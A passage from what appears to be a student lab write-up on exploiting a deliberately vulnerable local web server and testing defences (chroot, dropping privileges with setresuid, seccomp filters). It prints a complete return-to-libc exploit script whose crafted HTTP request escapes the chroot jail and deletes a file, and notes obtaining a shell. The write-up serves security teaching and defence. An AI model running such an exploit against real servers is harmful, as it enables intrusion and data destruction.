deleted.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619152219338.png"alt="image-20240619152219338" /><figcaption aria-hidden="true">image-20240619152219338</figcaption></figure><h3 id="delete-tmptest.txt-file">Delete /tmp/test.txt file</h3><figure><imgsrc="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240621163129108.png"alt="image-20240621163129108" /><figcaption aria-hidden="true">image-20240621163129108</figcaption></figure><p>Then try to delete the <code>/tmp/test.txt</code> file. This requiresusing chroot and chdir related calls to implement, so first need to findthe related addresses.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chroot&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chdir&quot; </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152017101.png"alt="image-20240621152017101" /><figcaption aria-hidden="true">image-20240621152017101</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d banksv</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152216367.png"alt="image-20240621152216367" /><figcaption aria-hidden="true">image-20240621152216367</figcaption></figure><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc base address</span></span><br><span class="line"><span class="comment"># ASLR shoud be off, so that libc&#x27;s base address will not change untill next reboot </span></span><br><span class="line"><span class="comment"># you can use &quot;ldd ./program&quot; to check the libc base address</span></span><br><span class="line">base_addr = <span class="number">0xf7db2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># all of the offsets of functions (strings) inside libc won&#x27;t change much (sometimes changed, so check is needed) .</span></span><br><span class="line"><span class="comment"># to get the offset of a funtion, you can use:</span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;</span></span><br><span class="line"><span class="comment"># to get &quot;/bin/sh&quot;:</span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system</span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span> </span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">sh_addr  = base_addr + <span class="number">0x0018e363</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">ex_addr  = base_addr + <span class="number">0x000340c0</span></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">ul_addr  = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># chroot</span></span><br><span class="line">chr_addr = base_addr + <span class="number">0x000fce60</span></span><br><span class="line"><span class="comment">#chdir</span></span><br><span class="line">chd_addr = base_addr + <span class="number">0x000f2c70</span></span><br><span class="line"><span class="comment"># pop-ret</span></span><br><span class="line">pop_addr = <span class="number">0x080d19a4</span></span><br><span class="line"><span class="comment"># dead</span></span><br><span class="line">d_addr   = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="comment"># ebp  too make the task simple, we print ebp of getToken function (vulnerable) </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Below is the function that you should modify to construct an</span></span><br><span class="line"><span class="comment">## HTTP request that will cause a buffer overflow in some part</span></span><br><span class="line"><span class="comment">## of the vulnerable web server and exploit it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode</span>):</span><br><span class="line">    shift_val = <span class="number">19</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chd_arg = <span class="string">&quot;..\0\0&quot;</span></span><br><span class="line">    chd_arg_addr =  ebp_addr + shift_val</span><br><span class="line"></span><br><span class="line">    chr_arg2 = <span class="string">&quot;server\0\0&quot;</span></span><br><span class="line">    chr_arg2_addr = ebp_addr + shift_val + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chr_arg = <span class="string">&quot;.\0\0\0&quot;</span></span><br><span class="line">    chr_arg_addr =  ebp_addr + shift_val + <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span></span><br><span class="line">    ul_arg_addr =   ebp_addr + shift_val + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span></span><br><span class="line">    sys_arg_addr =  ebp_addr + <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># All of the header information other than &quot;Content-Length&quot; is not important</span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># The Content-Length below is useful, and depends on the length of </span></span><br><span class="line">    <span class="comment"># username plus password, you need to use wireshark (together with web browser) </span></span><br><span class="line">    <span class="comment"># for checking the length</span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>) </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For different oses (and compilation), the length of fillup for </span></span><br><span class="line">    <span class="comment"># hijacking the return address in the stack, could be different,</span></span><br><span class="line">    <span class="comment"># therefore you need to debug the program for checking and adjusting.</span></span><br><span class="line"></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># remove a file use jail breaking</span></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg2_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ul_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(ul_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ex_addr)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 19 * 4</span></span><br><span class="line">    req += chd_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 19 * 4 + 4</span></span><br><span class="line">    req += chr_arg2.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 12</span></span><br><span class="line">    req += chr_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 16</span></span><br><span class="line">    req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Below is the username/password that you can Register into the web server</span></span><br><span class="line">    <span class="comment"># by using web browser. These information will be stored into the sqlite db behind.</span></span><br><span class="line">    <span class="comment"># You need to change these information according to your own registration.</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Note that successful POST will be responded by the server with a hint page.</span></span><br><span class="line">    <span class="comment"># By using the successful response, you can judge whether the server has been </span></span><br><span class="line">    <span class="comment"># crashed (by exploit), so that you can adjust the fillup accordingly.</span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)</span></span><br><span class="line">    <span class="comment">#req += (&quot;@@@@&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)</span><br><span class="line">    sock.send(req)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)</span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):</span><br><span class="line">      resp=resp+rbuf</span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(<span class="string">&quot;shellcode.bin&quot;</span>)):</span><br><span class="line">      shellfile = <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">      shellcode = shellfile.read()</span><br><span class="line">    req = build_exploit(shellcode)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line"></span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="defense-result-analysis">Defense Result Analysis</h3><p><code>chroot</code> is a technique used to change the root directoryof the current process and its child processes. Through<code>chroot</code>, a process and its child processes can be restrictedto a specific directory tree, preventing them from accessing files andresources outside the directory tree. This technique is commonly used toenhance system security, especially for isolating service programs (suchas web servers) to limit the scope of potential attack impacts.</p><p><code>chroot</code> changes the root directory of the callingprocess, making the process believe that the specified directory is theroot directory <code>/</code> of the file system. In this way, theprocess cannot access any files or directories outside this directory,thus achieving process isolation to some extent.</p><h2 id="change-process-euid-test-exploit">Change process euid, testexploit</h2><h3 id="experiment-environment-configuration-2">Experiment EnvironmentConfiguration</h3><p>To avoid affecting the previous experiment’s results, copy the codedirectory to code_euid. Of course, still need to disable addressrandomization to avoid address changes.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_euid</span><br></pre></td></tr></table></figure><h3 id="perform-euid-configuration">Perform euid configuration</h3><p>Add the following code at the fork child process code location inserver.c:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setresuid</span>(<span class="number">1000</span>,<span class="number">1000</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;User IDs successfully set to 1000.\n&quot;</span>);</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153144782.png"alt="image-20240619153144782" /><figcaption aria-hidden="true">image-20240619153144782</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br></pre></td></tr></table></figure><h3 id="perform-exploit-test-1">Perform exploit test</h3><p>Create test files then start the server, found that “User IDssuccessfully set to 1000” information was successfully printed.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> tmp directory</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start server</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153651371.png"alt="image-20240619153651371" /><figcaption aria-hidden="true">image-20240619153651371</figcaption></figure><p>Execute the script. Since there’s no difference from task one and theaddress hasn’t changed, directly use exploit_1.py.</p><p>Perform shell acquisition test, found that shell can be obtained butin non-privileged mode.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1 # Try to get shell</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621144856371.png"alt="image-20240621144856371" /><figcaption aria-hidden="true">image-20240621144856371</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 2 # Try to delete file</span><br></pre></td></tr></table></figure><p>Perform file deletion test, found that the <code>/tmp/test.txt</code>file still exists and was not deleted.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153901043.png"alt="image-20240619153901043" /><figcaption aria-hidden="true">image-20240619153901043</figcaption></figure><p>We can try to modify the owner of this file to myself and see if itcan be deleted.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Modify <span class="built_in">test</span> file owner</span></span><br><span class="line">sudo chown lixiang:root /tmp/test.txt</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619154643560.png"alt="image-20240619154643560" /><figcaption aria-hidden="true">image-20240619154643560</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619161636645.png"alt="image-20240619161636645" /><figcaption aria-hidden="true">image-20240619161636645</figcaption></figure><h3 id="defense-result-analysis-1">Defense Result Analysis</h3><p>This defense mainly prevents malicious operations as high-privilegeusers by reducing the privileges of the 3 child processes started by theserver. From the above results, we can also find that after activelygiving up root privileges, files owned by root cannot be deleted, butwhen the file owner is changed to lixiang (ordinary user), the test filecan be deleted normally. We also found a phenomenon that even if thefile’s user group is root, it can still be deleted, indicating that whendeleting files, it has nothing to do with the user group, but is relatedto the file owner.</p><h2id="use-seccomp-to-constrain-web-servers-vulnerable-process-test-exploit">Useseccomp to constrain web server’s vulnerable process, test exploit</h2><h3 id="experiment-environment-configuration-3">Experiment EnvironmentConfiguration</h3><p>Similarly copy the code to create a new code_seccomp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_seccomp</span><br></pre></td></tr></table></figure><p>Can use the following commands to check if the kernel has enabledseccomp:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> seccomp support is enabled:</span> </span><br><span class="line">grep CONFIG_SECCOMP= /boot/config-$(uname -r) </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> seccomp filter is enabled:</span> </span><br><span class="line">grep CONFIG_SECCOMP_FILTER= /boot/config-$(uname -r) </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619164635614.png"alt="image-20240619164635614" /><figcaption aria-hidden="true">image-20240619164635614</figcaption></figure><p>If the output is: <code>CONFIG_SECCOMP=y</code> and<code>CONFIG_SECCOMP_FILTER=y</code>, it means the kernel has enabledseccomp. To check if a specific process has enabled seccomp, use thefollowing command:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&lt;pid&gt;/status | grep Seccomp</span><br></pre></td></tr></table></figure><p>Where <pid> represents the process PID, can use <code>ps -au</code>to view. If the output contains a Seccomp field, it means the processuses seccomp. If there’s no such field, it means the process doesn’t useseccomp.</p><p>Modify the makefile file, add <code>-lseccomp</code> to thecompilation options for banksv</p><figure><imgsrc="https://picx.zhimg.com/80/v2-6adab4a46975fe018a720b338dd9ecf5_720w.png"alt="image-20240619170121404" /><figcaption aria-hidden="true">image-20240619170121404</figcaption></figure><p>Found that an additional libseccomp.so.2 library was added, so thebase address of libc.so.6 changed, just modify it in the script.</p><figure><imgsrc="https://pic1.zhimg.com/80/v2-0b7bc536cb3bbe375efa7e95c045f93d_720w.png"alt="image-20240619173424478" /><figcaption aria-hidden="true">image-20240619173424478</figcaption></figure><h3 id="perform-seccomp-coding">Perform seccomp coding</h3><h4 id="default-allow-explicit-deny">Default allow, explicit deny</h4><p>Modify banksv.c, add the following code, initialize with defaultallow rules, and add rules to deny unlink, then load seccomp.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619165715018.png"alt="image-20240619165715018" /><figcaption aria-hidden="true">image-20240619165715018</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_seccomp</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="type">int</span> ret;  </span><br><span class="line">    scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_ALLOW);  </span><br><span class="line">    <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;  </span><br><span class="line">    …  </span><br><span class="line">    <span class="built_in">init_seccomp</span>();  </span><br><span class="line">    …  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>Compile and run server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><h4 id="default-deny-explicit-allow">Default deny, explicit allow</h4><p>Modify banksv.c, add the following code, deny all rules by default,and add allowed rules, then load seccomp.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172906034.png"alt="image-20240619172906034" /><figcaption aria-hidden="true">image-20240619172906034</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_deny_bydefault_rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> ret;  </span><br><span class="line">  scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_KILL);  </span><br><span class="line">  <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">      </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(read), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(write), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(openat), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(rt_sigaction), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(socketcall), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(clone), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(set_robust_list), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getresuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getcwd), <span class="number">0</span>);  